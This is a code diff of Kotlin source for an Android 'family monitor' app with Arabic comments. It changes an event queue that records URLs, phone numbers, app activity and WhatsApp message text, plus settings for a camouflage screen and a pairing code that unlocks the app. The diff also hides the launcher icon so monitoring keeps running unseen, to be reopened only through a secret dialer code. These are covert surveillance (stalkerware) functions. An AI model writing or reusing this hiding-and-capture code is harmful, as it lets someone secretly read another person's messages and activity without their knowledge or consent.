@@ -11,7 +11,7 @@ import org.json.JSONObject
 object EventStore {
     private const val PREFS = "monitor_store"
     private const val KEY_QUEUE = "queue"
-    private const val MAX_EVENTS = 6000
+    private const val MAX_EVENTS = 3000
 
     // منع التكرار: بصمة الحدث → وقت إضافتها
     private val fingerprints = mutableMapOf<String, Long>()
@@ -19,7 +19,7 @@ object EventStore {
     fun addEvent(ctx: Context, ev: JSONObject) {
         val prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
         val arr = JSONArray(prefs.getString(KEY_QUEUE, "[]") ?: "[]")
-        // منع التكرار خلال 15 ثانية — البصمة تشمل نص الرسالة حتى لا تختلط رسائل واتساب المتتالية
+        // منع التكرار خلال 15 ثانية
         val fp = fingerprint(ev)
         val now = System.currentTimeMillis()
         fingerprints.entries.removeAll { it.value < now - 15_000 }
@@ -61,12 +61,10 @@ object EventStore {
     }
 
     private fun fingerprint(ev: JSONObject): String {
-        return listOf(
-            ev.optString("type"), ev.optString("url"), ev.optString("phone"),
+        return listOf(ev.optString("type"), ev.optString("url"), ev.optString("phone"),
             ev.optString("packageName"), ev.optString("app"), ev.optString("title"),
-            // نص رسالة واتساب (meta.text) حتى لا تُعتبر رسالتان متتاليتان من نفس الشخص تكرارًا
-            try { ev.getJSONObject("meta").optString("text") } catch (_: Exception) { "" }
-        ).joinToString("|")
+            ev.optString("meta"), ev.optString("direction"))
+            .joinToString("|")
     }
 
     private fun isoNow(): String {
@@ -125,42 +123,42 @@ object Prefs {
             .apply()
     }
 
-    // ---------- التفعيل ووضع التمويه ----------
+    // ---------- الحالة والاقتران وإخفاء الأيقونة ----------
 
-    /** هل اكتمل إعداد الجهاز الفرعي (التسجيل)؟ — بعدها تظهر شاشة التمويه بدل الإعدادات */
-    fun isActivated(ctx: Context): Boolean =
+    /** الجهاز مُسجّل ومُفعّل */
+    fun activated(ctx: Context): Boolean =
         ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean("activated", false)
 
     fun setActivated(ctx: Context, v: Boolean) {
-        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
-            .putBoolean("activated", v).apply()
+        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putBoolean("activated", v).apply()
     }
 
-    // ---------- إخفاء أيقونة التطبيق ----------
+    /** كود الاقتران — يُستخدم ككلمة مرور فتح التطبيق بعد الإخفاء */
+    fun pairingCode(ctx: Context): String? =
+        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getString("pairing_code", null)
 
-    /** هل أيقونة التطبيق مخفية من قائمة التطبيقات؟ */
-    fun isIconHidden(ctx: Context): Boolean =
-        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean("icon_hidden", false)
+    fun setPairingCode(ctx: Context, code: String) {
+        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putString("pairing_code", code).apply()
+    }
 
-    /**
-     * إخفاء/إظهار أيقونة التطبيق من قائمة التطبيقات.
-     * الخدمات (المراقبة/التصفح/الإشعارات) تستمر في العمل طبيعيًا،
-     * والعودة إلى التطبيق تكون بالكود السري من لوحة الاتصال:
-     *   *#*#7594#*#*
-     */
-    fun setIconHidden(ctx: Context, hidden: Boolean) {
+    /** هل الأيقونة مخفية من الشاشة الرئيسية؟ */
+    fun hideIcon(ctx: Context): Boolean =
+        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).getBoolean("hide_icon", false)
+
+    fun setHideIcon(ctx: Context, v: Boolean) {
+        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().putBoolean("hide_icon", v).apply()
+    }
+
+    /** إخفاء/إظهار أيقونة التطبيق من الشاشة الرئيسية (الفتح بعد الإخفاء بكود الاتصال السري) */
+    fun setLauncherIconHidden(ctx: Context, hidden: Boolean) {
         val pm = ctx.packageManager
-        try {
-            pm.setComponentEnabledSetting(
-                android.content.ComponentName(ctx, Config.LAUNCHER_ALIAS),
-                if (hidden) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-                else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-            )
-            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit()
-                .putBoolean("icon_hidden", hidden).apply()
-        } catch (e: Exception) {
-            android.util.Log.e("Prefs", "تعذر تغيير حالة الأيقونة", e)
-        }
+        val comp = android.content.ComponentName(ctx, "com.family.monitor.MainActivity")
+        pm.setComponentEnabledSetting(
+            comp,
+            if (hidden) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+            else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+            android.content.pm.PackageManager.DONT_KILL_APP
+        )
+        setHideIcon(ctx, hidden)
     }
 }
